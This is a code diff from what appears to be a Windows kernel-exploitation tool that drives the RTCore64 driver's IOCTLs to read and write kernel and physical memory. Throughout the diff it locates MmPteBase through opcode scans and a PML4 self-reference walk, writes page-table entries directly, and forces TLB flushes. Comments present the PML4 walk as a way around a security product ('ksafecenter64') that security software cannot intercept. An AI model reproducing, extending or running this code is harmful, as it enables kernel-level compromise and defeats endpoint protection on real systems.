@@ -147,18 +147,18 @@ static DWORD64 FindMmPteBaseByMiGetPtePattern(const NtoskrnlImage& img) {
         bool isShr = (modrm & 0xF8) == 0xE8;
         if (!isSar && !isShr) continue;
 
-        // Found anchor.  Scan a window of [-8, +56] bytes around it.
-        DWORD wStart = (i > esec.foa + 8) ? (i - 8) : esec.foa;
-        DWORD wEnd   = ((i + 56 + 7) < end)  ? (i + 56) : (end - 7);
+        // Found anchor.  Scan a window of [-16, +80] bytes around it.
+        DWORD wStart = (i > esec.foa + 16) ? (i - 16) : esec.foa;
+        DWORD wEnd   = ((i + 80 + 7) < end)  ? (i + 80) : (end - 7);
 
         for (DWORD j = wStart; j < wEnd; j++) {
-            // MmPteBase is the base that gets ADDED to the PTE index.
-            // Only count ADD r64,[rip+X] (opcode 0x03) to filter out
-            // RIP-relative MOVs that load unrelated variables.
+            // Accept both ADD r64,[rip+X] (0x03) and MOV r64,[rip+X] (0x8B).
+            // Win10 22H2 MiGetPteAddress uses MOV r11,[MmPteBase] then register ADD,
+            // so we must count MOV references too to find the right variable.
             if (j + 6 >= end) continue;
             BYTE rex = buf[j], op = buf[j+1], modrm = buf[j+2];
             if (rex != 0x48 && rex != 0x4C) continue;
-            if (op != 0x03) continue; // ADD only
+            if (op != 0x03 && op != 0x8B) continue; // ADD or MOV (RIP-relative)
             if ((modrm & 0xC7) != 0x05) continue; // mod=00, r/m=101 (RIP-rel)
             INT32 off32    = *reinterpret_cast<const INT32*>(&buf[j + 3]);
             DWORD instrRVA = (j - esec.foa) + esec.rva;
@@ -179,14 +179,14 @@ static DWORD64 FindMmPteBaseByMiGetPtePattern(const NtoskrnlImage& img) {
     for (auto& [cnt, rva] : ranked) {
         DWORD64 varVA = img.kBase + rva;
         DWORD64 val   = g_drv->Rd64(varVA);
+        if (g_debug)
+            printf("[pte] MiGetPteAddr pattern: RVA=0x%08X hits=%d  val=0x%016llX\n",
+                   rva, cnt, val);
         if (g_drv->IsKernelVA(val) && (val & ALIGN_512G) == 0) {
             printf("[pte] MiGetPteAddr pattern: RVA=0x%08X hits=%d  MmPteBase=0x%016llX\n",
                    rva, cnt, val);
             return varVA;
         }
-        if (g_debug)
-            printf("[pte] MiGetPteAddr pattern: RVA=0x%08X hits=%d  val=0x%016llX (skip)\n",
-                   rva, cnt, val);
     }
     printf("[pte] MiGetPteAddr pattern: no valid candidate\n");
     return 0;
@@ -288,26 +288,64 @@ static DWORD64 FindMmPfnDatabaseByPattern(const NtoskrnlImage& img) {
 //   Security software cannot intercept this without breaking all memory access.
 //
 // Returns MmPteBase value, or 0 on failure.
+// ── Method 0a: PML4 self-reference via MapPhys (hardware level, no kernel globals)
+//
+// Read CR3 from System EPROCESS.DirectoryTableBase (+0x28).
+// Map the PML4 physical page via RTCore64's MmMapIoSpace IOCTL.
+// Scan entries [256..511] for the self-referencing entry (PA points to PML4 itself).
+// MmPteBase = 0xFFFF000000000000 | (self_ref_index << 39).
+//
+// This is completely independent of ntoskrnl globals that ksafecenter64 patches.
+// Safe: MapPhys reads physical RAM, no virtual address guessing, no BSOD risk.
 static DWORD64 FindMmPteBaseByCR3Walk() {
-    // Need a known kernel VA to probe.  Use ntoskrnl base — it's always mapped.
-    LPVOID d[1]; DWORD cb;
-    if (!EnumDeviceDrivers(d, sizeof(d), &cb)) return 0;
-    DWORD64 kBase = (DWORD64)d[0];
-    if (!g_drv->IsKernelVA(kBase)) return 0;
+    // 1. System EPROCESS via PsInitialSystemProcess export
+    DWORD64 sysEP = g_drv->Rd64(KUtil::KernelExport("PsInitialSystemProcess"));
+    if (!g_drv->IsKernelVA(sysEP)) {
+        printf("[pte] PML4Walk: PsInitialSystemProcess unavailable\n");
+        return 0;
+    }
 
-    // pteIdx(va) = (va & 0x0000FFFFFFFFF000) >> 9  (byte offset into PTE array)
-    // PTE_VA = MmPteBase + pteIdx(kBase)
-    DWORD64 pteOffset = (kBase & 0x0000FFFFFFFFF000ULL) >> 9;
+    // 2. CR3 = EPROCESS.DirectoryTableBase (_KPROCESS+0x28)
+    DWORD64 cr3 = g_drv->Rd64(sysEP + 0x28);
+    if (!cr3) {
+        printf("[pte] PML4Walk: CR3 read returned 0\n");
+        return 0;
+    }
 
-    static const DWORD64 ALIGN_512G = (1ULL << 39) - 1;
+    // Clear low 12 bits (PCID, flags) to get raw PML4 physical address
+    DWORD64 pml4_pa = cr3 & 0x000FFFFFFFFFF000ULL;
 
-    // DISABLED — BSOD risk confirmed.
-    // Reading at arbitrary pteVA candidates is unsafe: RTCore64 does raw pointer
-    // dereference without SEH.  Unmapped addresses cause PAGE_FAULT (0x50).
-    // Confirmed: BSOD 0x50 at FFFF807C0019C004 (PML4 index 256 probe).
-    // Needs a safe physical-read path before this approach can be re-enabled.
-    (void)pteOffset;
-    return 0;
+    // 3. Map PML4 physical page via RTCore64 MmMapIoSpace IOCTL
+    DWORD64 pml4_va = g_drv->MapPhys(pml4_pa, 4096);
+    if (!pml4_va) {
+        if (g_debug)
+            printf("[pte] PML4Walk: MapPhys(PA=0x%012llX) failed\n", pml4_pa);
+        return 0;
+    }
+
+    // 4. Scan PML4 entries [256..511] for self-reference
+    //    Each entry: bits[51:12] = physical page number of next-level table.
+    //    Self-ref: entry's PA == PML4's own PA.
+    DWORD64 result = 0;
+    for (int i = 256; i < 512; i++) {
+        DWORD64 entry    = g_drv->Rd64(pml4_va + (DWORD64)i * 8);
+        DWORD64 entry_pa = entry & 0x000FFFFFFFFFF000ULL;
+        if (!entry_pa) continue;    // not present or not mapped
+        if (entry_pa == pml4_pa) {
+            // Self-reference at PML4[i] → MmPteBase = sign_extended(i << 39)
+            result = 0xFFFF000000000000ULL | ((DWORD64)i << 39);
+            printf("[pte] PML4Walk: self-ref at PML4[%d=0x%X]  CR3=0x%llX  MmPteBase=0x%016llX\n",
+                   i, i, cr3, result);
+            break;
+        }
+    }
+
+    // 5. Unmap physical page
+    g_drv->UnmapPhys(pml4_va, 4096);
+
+    if (!result)
+        printf("[pte] PML4Walk: no self-reference found in PML4[256..511]\n");
+    return result;
 }
 
 // ── Method 0b: CR3 physical walk via MmPfnDatabase ───────────────────────────
@@ -330,6 +368,9 @@ static DWORD64 FindMmPteBaseByPhysWalk(const NtoskrnlImage& img) {
     DWORD64 cr3 = g_drv->Rd64(sysEPROCESS + 0x28);
     if (!cr3) return 0;
     DWORD64 pfn = cr3 >> 12;   // bits[11:0] may be PCID; PFN is bits[63:12]
+    if (g_debug)
+        printf("[pte] PhysWalk: EPROCESS=0x%016llX  CR3=0x%016llX  PFN=0x%llX\n",
+               sysEPROCESS, cr3, pfn);
 
     // 3. MmPfnDatabase: try export first, then pattern scan
     DWORD64 pfnArray = 0;
@@ -342,6 +383,8 @@ static DWORD64 FindMmPteBaseByPhysWalk(const NtoskrnlImage& img) {
         pfnArray = FindMmPfnDatabaseByPattern(img);
     }
     if (!pfnArray) return 0;
+    if (g_debug)
+        printf("[pte] PhysWalk: MmPfnDatabase=0x%016llX\n", pfnArray);
 
     // 4-6. Try all sizeof(_MMPFN) strides × all known PteAddress offsets.
     //   sizeof(_MMPFN) observed on x64 Windows: 0x28, 0x30, 0x38, 0x40
@@ -354,9 +397,15 @@ static DWORD64 FindMmPteBaseByPhysWalk(const NtoskrnlImage& img) {
         DWORD64 pfnEntryVA = pfnArray + pfn * stride;
         if (!g_drv->IsKernelVA(pfnEntryVA)) continue;
         for (DWORD off : kPteOffsets) {
-            DWORD64 pteAddr  = g_drv->Rd64(pfnEntryVA + off);
-            if (!g_drv->IsKernelVA(pteAddr)) continue;
+            DWORD64 readVA = pfnEntryVA + off;
+            if (readVA < pfnEntryVA) continue;          // overflow guard
+            if (!g_drv->IsKernelVA(readVA)) continue;  // range guard
+            DWORD64 pteAddr   = g_drv->Rd64(readVA);
             DWORD64 candidate = pteAddr & ~ALIGN_512G;
+            if (g_debug)
+                printf("[pte] PhysWalk:   stride=0x%02X off=+0x%02X  pteAddr=0x%016llX  cand=0x%016llX\n",
+                       stride, off, pteAddr, candidate);
+            if (!g_drv->IsKernelVA(pteAddr)) continue;
             if (!g_drv->IsKernelVA(candidate) || (candidate & ALIGN_512G)) continue;
             printf("[pte] MmPteBase = 0x%016llX  (stride=0x%02X pteOff=+0x%02X)\n",
                    candidate, stride, off);
@@ -1673,7 +1722,7 @@ static DWORD64 FindMmPteBaseByRefScan(const NtoskrnlImage& img) {
     topN.reserve(refCnt.size());
     for (auto& kv : refCnt) topN.push_back({kv.second, kv.first});
     std::sort(topN.begin(), topN.end(), [](auto& a, auto& b){ return a.first > b.first; });
-    if (topN[0].first < 50) return 0;  // nothing looks plausible
+    if (topN[0].first < 10) return 0;  // nothing looks plausible
 
     static const DWORD64 ALIGN_512G = (1ULL << 39) - 1;  // bits [38:0]
 
@@ -2068,14 +2117,16 @@ void CmdPteBaseScan() {
 DWORD64 PteVaOf(DWORD64 va) {
     DWORD64 base = GetMmPteBase();
     if (!base) return 0;
-    // Strip sign extension bits (keep low 48 bits for the shift)
-    DWORD64 idx = (va & 0x0000FFFFFFFFFFFFULL) >> 9;
+    // PTE byte offset = page_frame_number * 8 = (va >> 12) * 8.
+    // Mask off sign-extension AND sub-page bits before dividing, so the result
+    // is always QWORD-aligned (required by the ReadPte alignment guard).
+    DWORD64 idx = (va & 0x0000FFFFFFFFF000ULL) >> 9;
     return base + idx;
 }
 
 bool IsVaMapped(DWORD64 va) {
     if (!s_pteBase || !va) return false;
-    DWORD64 pteVA = s_pteBase + ((va & 0x0000FFFFFFFFFFFFULL) >> 9);
+    DWORD64 pteVA = s_pteBase + ((va & 0x0000FFFFFFFFF000ULL) >> 9);
     if (!g_drv->IsKernelVA(pteVA) || (pteVA & 7)) return false;
     // pteVA is in the PTE self-map region; the PTE self-map itself is always
     // mapped for kernel VAs when MmPteBase is correct, so this read is safe.
@@ -2109,19 +2160,60 @@ bool WritePte(DWORD64 va, DWORD64 newPteVal) {
     DWORD64 pteVA = PteVaOf(va);
     if (!pteVA || !g_drv->IsKernelVA(pteVA)) return false;
 
-    // Attempt a true 8-byte atomic write.
+    // RTCore64's IOCTL_WRITE only reliably handles Size=1/2/4.
+    // Size=8 appears to return OK but silently writes nothing (no case in the
+    // dispatch table for Size=8).  Use explicit hi→lo two-DWORD writes instead.
     //
-    // On x86-64, an aligned 8-byte store is single-copy atomic (Intel SDM §8.2.3.1).
-    // PTEs are 8-byte aligned by construction (PTE array is a contiguous QWORD[]).
-    //
-    // RTCore64Backend::Wr64Atomic sends IOCTL_WRITE with Size=8.  If the kernel
-    // handler does *(QWORD*)addr = *(QWORD*)&op->Value it becomes one MOV QWORD →
-    // no window of inconsistency at all.  If the driver rejects Size=8 it falls back
-    // to the hi→lo two-write sequence (Present=1 throughout, brief PA inconsistency).
-    //
-    // Either way the write completes before this function returns.
-    bool atomic = g_drv->Wr64Atomic(pteVA, newPteVal);
-    printf("[pte] WritePte VA=0x%016llX PTE=0x%016llX (%s)\n",
-           va, newPteVal, atomic ? "ATOMIC 8B" : "hi-lo fallback");
+    // Write order: hi first (keeps old lo/PA → Present=1 throughout briefly
+    // inconsistent PA), then lo (atomically commits new PA with new flags).
+    // On x86-64, aligned DWORD stores are always single-copy atomic (SDM §8.2.3.1),
+    // so each half is individually safe; the brief PA mismatch window is harmless
+    // for our PTE-swap use case because we own both pages during the window.
+    DWORD loWord = (DWORD)(newPteVal & 0xFFFFFFFF);
+    DWORD hiWord = (DWORD)(newPteVal >> 32);
+    g_drv->Wr32(pteVA + 4, hiWord);
+    g_drv->Wr32(pteVA,     loWord);
+    printf("[pte] WritePte VA=0x%016llX PTE=0x%016llX (hi-lo Wr32 pair)\n",
+           va, newPteVal);
+    return true;
+}
+
+// Flush TLB for 'va' using MapPhys + WRITE IOCTL + UnmapPhys.
+//
+// Flow:
+//   1. ReadPte(va) → get physical address of va's page
+//   2. MapPhys(PA, 0x1000) → fresh kernel VA with no stale TLB entry
+//   3. Wr8(mapped + offset, curByte) → WRITE IOCTL acts as I/O serialization barrier
+//      ("jump back to WRITE" = reuse RTCore64 WRITE IOCTL 0x8000204C)
+//   4. UnmapPhys → MmUnmapIoSpace internally broadcasts TLB flush
+//
+// Replaces: newPte &= ~PTE_GLOBAL; SwitchToThread(); Sleep(5);
+// Falls back to SwitchToThread() if MapPhys is unavailable.
+bool FlushTlb(DWORD64 va) {
+    PteInfo pte = ReadPte(va);
+    if (!pte.valid || !pte.present || pte.page_pa == 0) {
+        SwitchToThread();
+        Sleep(5);
+        return false;
+    }
+
+    DWORD64 mapped = g_drv->MapPhys(pte.page_pa, 0x1000);
+    if (!mapped) {
+        if (g_debug)
+            printf("[pte] FlushTlb: MapPhys failed, falling back to SwitchToThread\n");
+        SwitchToThread();
+        Sleep(5);
+        return false;
+    }
+
+    // WRITE IOCTL: read-back the byte and write it unchanged.
+    // This is the I/O serialization step — forces RTCore64 to execute a kernel
+    // write through the fresh mapping, which acts as a store barrier and
+    // ensures the physical page is in a coherent state before UnmapPhys.
+    DWORD64 offset = va & 0xFFF;
+    BYTE cur = g_drv->Rd8(mapped + offset);
+    g_drv->Wr8(mapped + offset, cur);
+
+    g_drv->UnmapPhys(mapped, 0x1000);
     return true;
 }
